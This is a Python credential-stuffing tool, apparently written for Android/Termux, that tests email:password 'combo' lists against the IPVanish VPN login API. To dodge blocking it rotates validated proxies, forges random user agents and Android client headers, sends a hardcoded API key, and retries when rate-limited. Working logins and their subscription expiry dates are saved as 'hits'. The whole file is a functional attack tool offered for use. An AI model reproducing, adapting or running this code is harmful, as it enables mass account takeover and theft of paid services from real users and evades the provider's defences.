import requests
import time
import uuid
import json
import random
from user_agent import generate_user_agent
from cfonts import render
import os
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
# Importamos para codificar correctamente los usuarios y contraseñas de los proxies
from urllib.parse import quote

# --- CONFIGURACIÓN DE COLORES ---
Z = '\033[1;31m'  # Rojo
F = '\033[2;32m'  # Verde
B = '\033[2;36m'  # Cyan
X = '\033[1;33m'  # Amarillo
C = '\033[2;35m'  # Magenta
w = '\033[2;37m'  # Blanco
y = '\033[1;34m'  # Azul
R = '\033[0m'     # Reset

# --- CONSTANTES DE RUTAS ---
COMBO_DIR = "/storage/emulated/0/combo/"
PROXY_DIR = "/storage/emulated/0/Proxies/"
HIT_DIR = "/storage/emulated/0/HJ_IpVanish /"
HIT_FILE = os.path.join(HIT_DIR, "HJ_IpVanishHits.txt")
MAX_RETRIES = 2 # Número máximo de reintentos para una cuenta fallida

# --- FUNCIONES DE INTERFAZ Y UTILIDADES ---

def clear_screen():
    """Limpia la pantalla de la terminal."""
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    """Muestra el banner de bienvenida."""
    output = render('IPVanishCHK', colors=['cyan', 'white'], align='center')
    print(output)
    print(f"{C}      ~ Cσdígσ єchσ pσr HαchєJσtα ~")
    print(f"{w}      ~ Telegrαm: @hjofc123 ")
    print(f"{Z}_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ {R}\n")

def get_files_from_dir(directory, file_type="archivos"):
    """Obtiene una lista de archivos de un directorio."""
    if not os.path.exists(directory):
        print(f"{Z}Error: El directorio {directory} no fue encontrado.{R}")
        return []
    
    files = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
    if not files:
        print(f"{X}No se encontraron {file_type} en {directory}{R}")
    return files

def select_file(directory, file_type="archivo"):
    """Muestra un menú para que el usuario seleccione un archivo."""
    files = get_files_from_dir(directory, file_type)
    if not files:
        return None
        
    print(f"\n{B}Archivos de {file_type} disponibles:{R}")
    for i, file in enumerate(files, 1):
        print(f"{w}[{C}{i}{w}] {file}")
    
    while True:
        try:
            choice = input(f"\n{y}Seleccione el número del {file_type} que desea usar (o '0' para cancelar): {R}")
            if choice == '0':
                return None
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(files):
                return os.path.join(directory, files[choice_idx])
            else:
                print(f"{Z}Opción no válida. Intente de nuevo.{R}")
        except ValueError:
            print(f"{Z}Por favor, ingrese un número válido.{R}")

def epoch_to_date(epoch_timestamp):
    """Convierte un timestamp de epoch a una fecha legible."""
    try:
        if epoch_timestamp and str(epoch_timestamp).isdigit():
            return datetime.fromtimestamp(int(epoch_timestamp)).strftime('%Y-%m-%d %H:%M:%S')
        return "No disponible"
    except:
        return "No disponible"

# --- MANEJO DE PROXIES ---

def format_proxy_for_requests(proxy_string):
    """
    Formatea una cadena de proxy (ip:port o ip:port:user:pass) para la librería requests.
    Maneja caracteres especiales en el usuario y la contraseña.
    """
    try:
        if proxy_string.count(':') == 1: # Formato ip:port
            return {'http': f'http://{proxy_string}', 'https': f'http://{proxy_string}'}
        elif proxy_string.count(':') >= 3: # Formato ip:port:user:pass
            ip_port, user, pssw = proxy_string.rsplit(':', 2)
            user_enc = quote(user, safe='')
            pssw_enc = quote(pssw, safe='')
            proxy_url = f"http://{user_enc}:{pssw_enc}@{ip_port}"
            return {'http': proxy_url, 'https': proxy_url}
        else:
            return None
    except Exception:
        return None

def validate_proxy(proxy_string, timeout=10):
    """Valida un solo proxy haciendo una petición de prueba."""
    try:
        proxy_dict = format_proxy_for_requests(proxy_string)
        if not proxy_dict:
            return None
        
        response = requests.get('http://httpbin.org/ip', proxies=proxy_dict, timeout=timeout)
        if response.status_code == 200:
            return proxy_string
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, 
            requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError, requests.exceptions.InvalidURL):
        pass
    except Exception:
        pass
    return None

def validate_proxies(proxy_file_path):
    """Valida una lista de proxies de un archivo usando múltiples hilos."""
    print(f"\n{B}Validando proxies, por favor espere...{R}")
    valid_proxies = []
    try:
        with open(proxy_file_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        
        if not proxies:
            print(f"{Z}El archivo de proxies está vacío.{R}")
            return []

        total_proxies = len(proxies)
        checked_count = 0
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            future_to_proxy = {executor.submit(validate_proxy, p): p for p in proxies}
            
            for future in as_completed(future_to_proxy):
                checked_count += 1
                percent = (checked_count / total_proxies) * 100
                sys.stdout.write(f'\r{w}[{C}{checked_count}/{total_proxies}{w}] {F}{percent:.0f}% {w}Validado...{R}')
                sys.stdout.flush()
                
                result_proxy = future.result()
                if result_proxy:
                    valid_proxies.append(result_proxy)
        
        print(f"\n{F}✅ Validación completa. {len(valid_proxies)}/{total_proxies} proxies son válidos.{R}")
        return valid_proxies

    except Exception as e:
        print(f"\n{Z}Error al leer o validar el archivo de proxies: {e}{R}")
        return []

# --- LÓGICA PRINCIPAL DE VERIFICACIÓN ---

def check_account(email, password, proxy_list):
    """Verifica una cuenta usando un proxy aleatorio de la lista."""
    url = "https://trutri.org/api/v3/login"
    
    proxy_dict = None
    proxy_string_used = None
    if proxy_list:
        proxy_string_used = random.choice(proxy_list)
        proxy_dict = format_proxy_for_requests(proxy_string_used)
    
    headers = {
        'User-Agent': generate_user_agent(),
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'x-api-version': "3.3",
        'x-client': "ipvanish",
        'x-client-version': f"4.1.{random.randint(1,9)}.0.{random.randint(100000,999999)}-gtv",
        'x-platform': "Android",
        'x-platform-version': str(random.randint(25, 33))
    }
    
    payload = json.dumps({
        "username": str(email),
        "password": str(password),
        "api_key": "15cb936e6d19cd7db1d6f94b96017541",
        "uuid": str(uuid.uuid4()),
        "client": f"Android-4.1.{random.randint(1,9)}.0.{random.randint(100000,999999)}bnull",
        "os": f"4.1.{random.randint(1,9)}.0.{random.randint(100000,999999)}-gtv"
    })
    
    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=15)
        response_text = response.text
        
        if response.status_code == 200:
            if "access_token" in response_text:
                data = json.loads(response_text)
                return "good", data
            else:
                return "bad", "Credenciales incorrectas"
        elif response.status_code in [401, 403]:
            return "bad", "Error de autenticación"
        elif response.status_code == 429:
            return "retry", "Demasiadas peticiones (IP bloqueada)"
        else:
            return "error", f"Error HTTP: {response.status_code}"

    except requests.exceptions.ProxyError:
        return "proxy_failed", proxy_string_used
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
        return "error", "Error de conexión o timeout"
    except Exception as e:
        return "error", f"Error inesperado: {str(e)}"

def save_hit(account_data):
    """Guarda una cuenta válida en el archivo de hits con el formato especificado."""
    try:
        if not os.path.exists(HIT_DIR):
            os.makedirs(HIT_DIR)
            
        with open(HIT_FILE, 'a', encoding='utf-8') as f:
            f.write("🧃IpVanish Hit🧃\n")
            f.write("------------------------------------------------\n")
            f.write(f"🎋Correo : {account_data['email']}\n")
            f.write(f"🪴Contraseña: {account_data['password']}\n")
            f.write(f"🌱Expira: {account_data.get('sub_end_date', 'N/A')}\n")
            f.write(f"👑Echo Por HacheJota\n")
            f.write("--------------------------------------------------\n")
    except Exception:
        pass

def process_combos(combo_file, valid_proxies):
    """Procesa todas las cuentas del archivo de combo con un sistema de reintentos."""
    good_count = 0
    bad_count = 0
    failed_count = 0
    
    try:
        with open(combo_file, "r", encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            total_lines = len(lines)
            
        print(f"\n{B}Iniciando verificación de {total_lines} cuentas...{R}\n")
        
        for i, line in enumerate(lines, 1):
            line = line.strip()
            if ':' not in line:
                continue
            
            try:
                email, password = line.split(':', 1)
            except ValueError:
                continue

            retry_count = 0
            final_status = "failed" # Estado por defecto si todo falla
            final_data = None

            while retry_count <= MAX_RETRIES:
                status, data = check_account(email, password, valid_proxies)
                
                if status == "good":
                    final_status = "good"
                    final_data = data
                    break
                elif status == "bad":
                    final_status = "bad"
                    break
                elif status == "proxy_failed":
                    if data and data in valid_proxies:
                        valid_proxies.remove(data)
                # Para "error" o "retry", simplemente reintentaremos
                
                retry_count += 1
                if retry_count <= MAX_RETRIES:
                    # Informar del reintento sin saturar la consola
                    sys.stdout.write(f'\r{w}[{C}{i}/{total_lines}{w}] {F}HITS: {good_count}{w} | {Z}BAD: {bad_count}{w} | {X}FALLIDOS: {failed_count}{w} -> Reintentando ({retry_count}/{MAX_RETRIES})...{R}')
                    sys.stdout.flush()
                    time.sleep(retry_count * 2) # Espera exponencial

            # Procesar el resultado final después de los reintentos
            if final_status == "good":
                good_count += 1
                account_info = {
                    'email': email,
                    'password': password,
                    'sub_end_date': epoch_to_date(final_data.get('sub_end_epoch'))
                }
                save_hit(account_info)
            elif final_status == "bad":
                bad_count += 1
            else: # "failed"
                failed_count += 1

            # Actualizar la barra de progreso final para esta cuenta
            sys.stdout.write(f'\r{w}[{C}{i}/{total_lines}{w}] {F}HITS: {good_count}{w} | {Z}BAD: {bad_count}{w} | {X}FALLIDOS: {failed_count}{R}')
            sys.stdout.flush()

            time.sleep(random.uniform(1, 3))

    except Exception:
        pass
    
    # Resumen final
    print(f"\n\n{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"{F}✅ HITS: {good_count} | {Z}❌ BAD: {bad_count} | {X}💥 FALLIDOS: {failed_count}")
    print(f"{F}💾 Hits guardados en: {HIT_FILE}{R}")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}")

# --- FUNCIÓN PRINCIPAL ---

def main():
    clear_screen()
    show_banner()
    
    combo_file = select_file(COMBO_DIR, "combo")
    if not combo_file:
        print(f"{X}No se seleccionó ningún archivo de combo. Saliendo...{R}")
        time.sleep(2)
        return

    print(f"\n{B}¿Desea usar proxies?{R}")
    print(f"{w}[{C}1{w}] Sí")
    print(f"{w}[{C}2{w}] No")
    
    valid_proxies = []
    while True:
        proxy_choice = input(f"\n{y}Opción: {R}")
        if proxy_choice == '1':
            proxy_file = select_file(PROXY_DIR, "proxy")
            if proxy_file:
                valid_proxies = validate_proxies(proxy_file)
                if not valid_proxies:
                    print(f"{Z}No se encontraron proxies válidos. Continuando sin proxies.{R}")
            break
        elif proxy_choice == '2':
            print(f"{X}Continuando sin proxies.{R}")
            break
        else:
            print(f"{Z}Opción no válida.{R}")

    clear_screen()
    show_banner()
    process_combos(combo_file, valid_proxies)
    
    input(f"\n{y}Presione Enter para salir...{R}")

if __name__ == "__main__":
    main()